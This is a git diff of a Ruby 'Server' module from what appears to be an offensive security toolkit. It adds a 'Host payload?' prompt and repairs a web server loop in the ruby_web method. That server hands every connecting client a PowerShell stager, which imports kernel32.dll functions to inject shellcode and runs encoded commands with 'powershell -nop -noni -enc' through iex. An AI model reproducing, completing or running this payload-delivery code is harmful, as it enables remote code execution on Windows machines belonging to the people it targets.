@@ -5,6 +5,7 @@ require 'core'
 include Core::Commands
 module Server
   class Setup
+    include Core::Files
     def ssl(host, port)
       tcp_server = TCPServer.new(host, port)
       ctx = OpenSSL::SSL::SSLContext.new
@@ -16,7 +17,7 @@ module Server
     end
 
     def use_ssl?
-      ssl = rgets('Use ssl? ',  't')
+      ssl = rgets('Use ssl? [t/f]: ',  't')
       ssl.downcase[0] == 't' ? true : false
     end
 
@@ -34,6 +35,14 @@ module Server
       end
       print_success("Using #{port}")
       port
+    end
+
+    def host_payload?
+      choice = ''
+      until choice.downcase[0] == 'y' || choice.downcase[0] == 'no'
+        choice = rgets('Host payload? [y/n]: ', 'y')
+      end
+      choice.downcase[0] == 'y' ? true : false
     end
   end
 
@@ -113,6 +122,7 @@ module Server
     rescue => error
       print_error(error)
     end
+
     def web
       print_info('Checking for Apache')
       sleep(2)
@@ -161,6 +171,7 @@ module Server
       print_error("#{error}\n")
       exit
     end
+
     def ruby_web(shellcode)
       time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
       s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
@@ -182,16 +193,20 @@ module Server
       s << %(-noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";)
       s << %(iex "& powershell $cmd $gq";})
       loop do
-        Thread.start(@server.accept) do |client|
-          print_info("Client Connected!\n")
-          headers = ['HTTP/1.1 200 OK',
-                     "Date: #{time}",
-                     'Server: Ruby',
-                     'Content-Type: text/html; charset=iso-8859-1',
-                     "Content-Length: #{resp.length}\r\n\r\n"].join("\r\n")
-          client.print headers
-          client.print "#{resp}\n"
-          client.close
+        begin
+          Thread.start(@server.accept) do |client|
+            print_info("Client Connected!\n")
+            headers = ['HTTP/1.1 200 OK',
+                       "Date: #{time}",
+                       'Server: Ruby',
+                       'Content-Type: text/html; charset=iso-8859-1',
+                       "Content-Length: #{s.length}\r\n\r\n"].join("\r\n")
+            client.print headers
+            client.print "#{s}\n"
+            client.close
+          end
+        rescue => e
+          puts e
         end
       end
     end
